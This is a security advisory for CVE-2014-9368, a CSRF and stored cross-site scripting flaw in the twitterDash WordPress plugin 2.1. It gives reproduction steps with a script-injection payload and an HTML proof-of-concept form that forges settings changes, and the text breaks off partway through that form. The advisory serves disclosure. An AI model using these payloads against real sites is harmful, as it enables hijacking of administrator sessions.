# Title: CSRF / Stored XSS Vulnerability in twitterDash Wordpress Plugin 
# Author: Manideep K	
# CVE-ID: CVE-2014-9368
# Plugin Homepage: https://wordpress.org/plugins/twitterdash/
# Version Affected: 2.1 (probably lower versions)
# Severity: High 

#About Plugin:
twitterDash adds a field on the Dashboard. In this field you find the last(you can define how many) updates on the friends timeline of your twitter(http://www.twitter.com) account.You will see your friends profile images, usernames and updates, all the links that they have posted are active and the "@username" links to that users timeline. Enable the update panel and you can update your own timeline from your Dashboard. This plugin does not require the PHP cURL-extension, you can run this on every server.

# Description: 
Vulnerable Parameter: all three text boxes, to name one - username_twitterDash
Vulnerability Class: 
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

# About Vulnerability:  This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 

# Steps to Reproduce: (POC):
After installing the plugin
1. Goto settings -> TwitterDash
2. Insert this payload “ "><script>alert(32)</script> “ into any/all fields
Update options and see XSS in action
3. Visit settings page of this plugin anytime later and you can see the script executing as it is stored. 


Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below


<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=twitterDash.php" method="POST">
      <input type="hidden" name="username&#95;twitterDash" value="csrf baby" />
      <input type="hidden" name="password&#95;twitterDash" value="hi" />
      <input type="hidden" name="count&#95;twitterDash" value="hi" />
      <input type="hidden" name="update&#95;twitterDash" value="Update&#32;Settings" />
      <input type="submit" value="Submit request" />
